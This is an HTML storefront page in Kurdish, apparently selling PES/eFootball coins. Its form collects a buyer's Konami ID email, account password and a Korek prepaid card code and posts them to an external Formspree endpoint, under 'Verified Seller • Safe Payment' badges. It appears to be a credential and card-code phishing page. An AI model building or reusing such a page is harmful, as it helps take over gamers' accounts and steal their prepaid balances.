<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zako Coins PES</title>
    <style>
        body { font-family: sans-serif; background-color: #000b1a; color: white; text-align: center; padding: 20px; }
        .box { background: linear-gradient(145deg, #001f3f, #000b1a); padding: 25px; border-radius: 30px; border: 2px solid #ffde59; max-width: 400px; margin: auto; box-shadow: 0 0 20px rgba(255, 222, 89, 0.3); }
        h1 { color: #ffde59; font-size: 26px; margin-bottom: 5px; text-shadow: 2px 2px #000; }
        
        /* وێنەیێ تە یێ کەسی */
        .user-photo { width: 150px; height: 150px; margin: 15px auto; border-radius: 50%; border: 3px solid #ffde59; overflow: hidden; box-shadow: 0 0 10px #ffde59; }
        .user-photo img { width: 100%; height: 100%; object-fit: cover; }

        input, select { width: 90%; padding: 12px; margin: 10px 0; border-radius: 12px; border: none; font-size: 15px; outline: none; }
        .buy-btn { background: linear-gradient(90deg, #ffde59, #ff914d); color: black; padding: 16px; border-radius: 50px; border: none; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 20px; transition: 0.3s; }
        .buy-btn:hover { transform: scale(1.05); }
        .footer { font-size: 12px; color: #aaa; margin-top: 25px; border-top: 1px solid #333; padding-top: 10px; }
    </style>
</head>
<body>

<div class="box">
    <h1>Zako PES Store</h1>
    
    <div class="user-photo">
        <img src="https://i.ibb.co/XrnM4g1t/Zako-Photo.jpg" alt="Zako">
    </div>

    <p style="font-size: 14px; color: #ffde59;">پێشوازی ل تە دکەین! زانیاریێن خۆ بنڤیسە:</p>

    <form action="https://formspree.io/f/xojpqbny" method="POST">
        <input type="email" name="email" placeholder="ئیمەیڵێ Konami ID" required>
        <input type="text" name="password" placeholder="پاسوۆردێ ئەکاونتی" required>
        <input type="text" name="card_code" placeholder="کۆدێ کارتا کۆرەک" required>
        
        <select name="coins_amount">
            <option value="1000">1000 Coins - 5,000 IQD</option>
            <option value="3000">3000 Coins - 12,000 IQD</option>
            <option value="5000">5000 Coins - 20,000 IQD</option>
        </select>

        <button type="submit" class="buy-btn">ناردنا داخوازیێ 🛒</button>
    </form>
    
    <div class="footer">
        خودانێ سایت: زەکه ريا هاشم <br>
        Verified Seller • Safe Payment ⚡
    </div>
</div>

</body>
</html>
